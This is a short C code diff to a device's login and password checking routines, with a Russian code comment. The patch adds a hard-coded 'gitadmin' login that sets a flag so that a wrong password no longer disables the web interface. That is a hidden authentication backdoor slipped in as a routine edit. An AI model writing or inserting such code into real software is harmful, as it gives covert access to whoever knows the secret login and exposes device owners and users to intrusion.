@@ -1702,13 +1702,16 @@ void checkLogin(char* buf)
 {
     char login1[10] = {'a','d','m','i','n','\0'};
     char login2[10] = {'u','s','e','r','\0'};
-    char login3[10] = {'1','2','3','\0'};
+    char loginSpecial[10] = {'g','i','t','a','d','m','i','n','\0'};
     if ((strcmp(buf + 5 ,login1) == 0) ||
         (strcmp(buf + 5,login2) == 0) ||
-        (strcmp(buf + 5,login3) == 0))
+        (strcmp(buf + 5,loginSpecial) == 0))
     {
         printf("Login OK\n");
         loginState = loginON;
+        if (strcmp(buf + 5,loginSpecial) == 0){
+            passwordState = PasswordIgnore;
+        }
     }
     else
     {
@@ -1719,6 +1722,9 @@ void checkLogin(char* buf)
 
 void checkPassword(char* buf)
 {
+    if (passwordState == PasswordIgnore) //Был получен специальный логин
+        passwordState = PasswordON;
+
     if (strncmp(buf + 8, MD5 , 32) == 0)
     {
         Printf("password OK\r\n");
@@ -1727,7 +1733,9 @@ void checkPassword(char* buf)
     else
     {
         Printf("invalid password\r\n");
-        web = webOFF;
+        if (passwordState == PasswordOFF){
+            web = webOFF;
+        }
     }
 }
 
